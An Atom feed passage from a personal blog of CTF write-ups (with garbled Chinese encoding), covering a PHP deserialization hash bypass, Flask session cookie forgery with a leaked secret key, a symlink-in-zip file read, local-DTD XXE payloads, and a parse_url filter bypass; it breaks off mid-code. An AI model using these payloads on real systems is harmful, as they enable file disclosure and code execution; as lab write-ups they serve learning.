<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1__/\/ã®blog</title>
  
  <subtitle>LN</subtitle>
  <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
  
  <link href="http://lll-nnn.github.io/"/>
  <updated>2021-09-10T15:03:58.085Z</updated>
  <id>http://lll-nnn.github.io/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BSidesCF 2020 Hurdles</title>
    <link href="http://lll-nnn.github.io/2021/09/10/BUU94/"/>
    <id>http://lll-nnn.github.io/2021/09/10/BUU94/</id>
    <published>2021-09-10T15:01:36.000Z</published>
    <updated>2021-09-10T15:03:58.085Z</updated>
    
    <content type="html"><![CDATA[<p>çœŸå°±å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€å‘—ï¼Œè¿™ä¹ˆå¤šå±‚</p><p><a href="https://blog.csdn.net/cjdgg/article/details/119881039">https://blog.csdn.net/cjdgg/article/details/119881039</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;çœŸå°±å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€å‘—ï¼Œè¿™ä¹ˆå¤šå±‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/cjdgg/article/details/119881039&quot;&gt;https://blog.csdn.net/cjdgg/article/details/119881</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="å‡çŒªå¥—" scheme="http://lll-nnn.github.io/categories/CTF/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="å‡çŒªå¥—" scheme="http://lll-nnn.github.io/tags/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
    
  </entry>
  
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2020 Greatphp</title>
    <link href="http://lll-nnn.github.io/2021/09/07/BUU93/"/>
    <id>http://lll-nnn.github.io/2021/09/07/BUU93/</id>
    <published>2021-09-07T14:01:28.000Z</published>
    <updated>2021-09-07T14:38:38.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><p>ç»™äº†æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>åˆ©ç”¨ErroråŸç”Ÿç±»ç»•è¿‡<code>md5</code>å’Œ<code>sha1</code>      </li></ul><p>æœ¬åœ°æµ‹è¯•</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>($a != $b)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(md5($a) === md5($b))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5 success&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1 success&quot;</span>;&#125;</code></pre><p>æµ‹è¯•ç»“æœ<br><code>$a = new Error(&quot;llnn&quot;,1);</code>å’Œ<code>$b = new Error(&quot;llnn&quot;,2);</code>ä¸åœ¨ä¸€è¡Œçš„è¯<code>md5</code>å’Œ<code>sha1</code>æ˜¯ä¸ç­‰çš„ </p><p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png">      </p><p>è€Œä¸”<code>llnn</code>é‚£é‡Œï¼Œä¹Ÿå°±æ˜¯Errorç±»çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·ï¼š<code>?&gt;&lt;?=phpinfo();?&gt;</code>ä½†æœ‰è¿‡æ»¤ï¼Œå°æ‹¬å·å’Œ<code>/</code>éƒ½ä¸èƒ½ç”¨ï¼Œå¯ä»¥ç›´æ¥<code>include /flag</code>;å°†<code>/flag</code>urlç¼–ç å–åç»•è¿‡</p><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);%D0%99%93%9E%98php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);/flag</code></pre><p>payloadï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<span class="hljs-keyword">public</span> $syc;<span class="hljs-keyword">public</span> $lover;&#125;$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$c = <span class="hljs-keyword">new</span> SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;<span class="hljs-keyword">echo</span>(urlencode(serialize($c))); <span class="hljs-meta">?&gt;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp&quot;&gt;&lt;a href=&quot;#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp&quot; class=&quot;headerlink&quot; title=&quot;[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp&quot;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019 Web3</title>
    <link href="http://lll-nnn.github.io/2021/09/05/BUU92/"/>
    <id>http://lll-nnn.github.io/2021/09/05/BUU92/</id>
    <published>2021-09-05T14:54:41.000Z</published>
    <updated>2021-09-07T14:06:45.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>æ‰“å¼€ç¯å¢ƒ<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png"><br>éšä¾¿ç™»ä¸ªadmin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png"><br>ç‚¹å‡»<code>upload</code>ä¼šå¾—åˆ°<code>Permission denied!</code><br>æ³¨æ„åˆ°ç½‘ç«™æ ‡é¢˜æ˜¯<code>CTF-Flask-Demo</code>,æ‰€ä»¥å»è§£ä¸€ä¸‹session<br>è§£å¯†è„šæœ¬ï¼š</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-comment"># flask-session-cookie-manager-master  ä¹Ÿèƒ½è§£session</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    decompress = <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):        payload = payload[<span class="hljs-number">1</span>:]        decompress = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        payload = base64_decode(payload)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)    <span class="hljs-keyword">if</span> decompress:        <span class="hljs-keyword">try</span>:            payload = zlib.decompress(payload)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))</code></pre><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>ä¹‹åä¼ªé€ cookie,è®©idä¸º<code>b&#39;1&#39;</code>,éœ€è¦key</p><p>ç„¶åï¼Œå¦‚æœè®¿é—®ç½‘ç«™ä¸å­˜åœ¨çš„è·¯ç”±ä¼šè¿”å›<code>404 not found</code>ä½†statusæ˜¯200ï¼Œåœ¨å“åº”å¤´é‡Œæœ‰ï¼š<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64è§£ç åå¾—åˆ°ï¼š<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p><p>ç„¶åç”¨<code>flask-session-cookie-manager</code>åŠ å¯†å³å¯</p><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre><p><code>/upload</code>é¡µé¢æ›´æ¢cookie</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png">    </p><p>å¾—åˆ°æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œä¸”æ³¨é‡Šä¸­æœ‰æºç </p><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:        <span class="hljs-keyword">return</span> render_template_string(temp)    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:        m = hashlib.md5()        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        m.update(name)        md5_one= m.hexdigest()        n = hashlib.md5()        ip = request.remote_addr        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        n.update(ip)        md5_ip = n.hexdigest()        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        basepath=os.path.dirname(os.path.realpath(__file__))        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>        filename = f.filename        pathname = path+filename        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">-1</span>]:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):            <span class="hljs-keyword">try</span>:                os.makedirs(path_base)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):            <span class="hljs-keyword">try</span>:                os.makedirs(path)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):            <span class="hljs-keyword">try</span>:                f.save(pathname)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">try</span>:            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != <span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != <span class="hljs-number">-1</span>:waf()                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            os.system(cmd)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span>        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != <span class="hljs-number">-1</span>:                shutil.rmtree(path_base)                os.mkdir(path_base)                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()            resp = make_response(image)            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>            <span class="hljs-keyword">return</span> resp        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            shutil.rmtree(path_base)            os.mkdir(path_base)            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<span class="hljs-meta">@app.route(&#x27;/showflag&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showflag</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()        resp = make_response(image)        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre><p>ä¸¤ä¸ªè·¯ç”±ï¼Œç¬¬ä¸€ä¸ªè¦æ±‚ä¸Šä¼ ä¸ªå›¾ç‰‡å‹ç¼©åŒ…ï¼Œç¬¬äºŒä¸ªè¯´æ˜flagåœ¨flaskæ ¹ç›®å½•ä¸‹çš„flagé‡Œçš„flag.jpgä¸­</p><p><code>showflag()</code>è·¯ç”±çš„<code>True==False</code>æ˜¯æ’<code>False</code>çš„ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ç¬¬äºŒä¸ªè·¯ç”±æ‹¿åˆ°flagï¼Œè¿™é‡Œé€šè¿‡ç¬¬ä¸€ä¸ªè·¯ç”±ä¸Šä¼ ä¸ªè½¯é“¾æ¥è¯»å–æ–‡ä»¶      </p><p><code>ln -s</code>æ˜¯Linuxçš„ä¸€ç§è½¯è¿æ¥ï¼Œç›¸å½“äºWindowsçš„å¿«æ·æ–¹å¼<br>æ¯”å¦‚</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]â””â”€# ln -s /etc/passwd test       </code></pre><p>æ‰“å¼€<code>test</code>ä¸­å°±æ˜¯<code>/etc/passwd</code>ä¸­çš„å†…å®¹äº†        </p><p><code>/proc/self</code> è®°å½•äº†ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯çŠ¶æ€ç­‰,<code>cwd</code>æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥,å³flaskè¿è¡Œè¿›ç¨‹ç›®å½•      </p><p>payload:   </p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# ln -s /proc/self/cwd/flag/flag.jpg testâ”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# zip -ry test.zip test</code></pre><p>ç„¶åå°†<code>test.zip</code>ä¸Šä¼ å³å¯å¾—åˆ°flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SWPU2019-Web3&quot;&gt;&lt;a href=&quot;#SWPU2019-Web3&quot; class=&quot;headerlink&quot; title=&quot;[SWPU2019]Web3&quot;&gt;&lt;/a&gt;[SWPU2019]Web3&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒ&lt;br&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="flask" scheme="http://lll-nnn.github.io/categories/CTF/flask/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="flask" scheme="http://lll-nnn.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Bnv</title>
    <link href="http://lll-nnn.github.io/2021/08/01/BUU91/"/>
    <id>http://lll-nnn.github.io/2021/08/01/BUU91/</id>
    <published>2021-08-01T04:10:36.000Z</published>
    <updated>2021-08-01T04:44:32.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png"><br><code>submit</code>æŠ“åŒ…   </p><pre><code>POST /api/search HTTP/1.1Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type: application/jsonContent-Length: 38Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnConnection: closeReferer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre><p><code>json</code><br>å°è¯•sqliï¼Œä¸è¡Œ<br>æœ‰jsonçš„åœ°æ–¹å¯èƒ½å­˜åœ¨<code>xxe</code><br><code>Content-type</code>æ”¹ä¸º<code>application/xml</code>   </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre><p>è¿”å›<code>No result found</code>     </p><p>çœ‹æ¥ä¸è¡Œ    </p><p>WPï¼š</p><p><a href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>åˆ©ç”¨æœ¬åœ°DTDæ–‡ä»¶è¿›è¡ŒXXE</code></a>       </p><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GoogleCTF2019-Quals-Bnv&quot;&gt;&lt;a href=&quot;#GoogleCTF2019-Quals-Bnv&quot; class=&quot;headerlink&quot; title=&quot;[GoogleCTF2019 Quals]Bnv&quot;&gt;&lt;/a&gt;[GoogleCTF2019 Q</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="xxe" scheme="http://lll-nnn.github.io/categories/CTF/xxe/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="xxe" scheme="http://lll-nnn.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>Eating_cms</title>
    <link href="http://lll-nnn.github.io/2021/08/01/BUU90/"/>
    <id>http://lll-nnn.github.io/2021/08/01/BUU90/</id>
    <published>2021-08-01T03:49:47.000Z</published>
    <updated>2021-08-01T04:27:07.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-è§£ææ¼æ´"><a href="#parse-url-è§£ææ¼æ´" class="headerlink" title="parse_url()è§£ææ¼æ´"></a><code>parse_url()</code>è§£ææ¼æ´</h4><ul><li><p><code>function.php</code>ä¸­</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    $keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);<span class="hljs-comment">//    var_dump($query);</span><span class="hljs-comment">//    die();</span>    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)    &#123;        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)        &#123;            <span class="hljs-keyword">if</span> (stristr($k, $token))                hacker();            <span class="hljs-keyword">if</span> (stristr($v, $token))                hacker();        &#125;    &#125;&#125;</code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>è¿™æ ·å°±ä¼šè¢«åŒ¹é…åˆ°ï¼Œä¸èƒ½è¯»å–ï¼›ä½†æ˜¯å¦‚æœè¿™æ ·<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_urlå°±ä¼šè¿”å›<code>false</code>ï¼›è¯»å–æˆåŠŸã€‚</p><p><img src="https://ftp.bmp.ovh/imgs/2021/08/777d762da5a7bc08.png"></p><p><strong>æ¼æ´é—®é¢˜åªå­˜åœ¨äºphp5.4.7ä»¥å‰</strong></p><hr><p>çœŸæ­£çš„ä¸Šä¼ åœ°å€<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p><pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span><span class="hljs-meta">&lt;?php</span>$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);$size = <span class="hljs-number">10000000</span>;$path = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;$filename = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload fileï¼&quot;</span>);&#125;$newfile = $path.$filename;<span 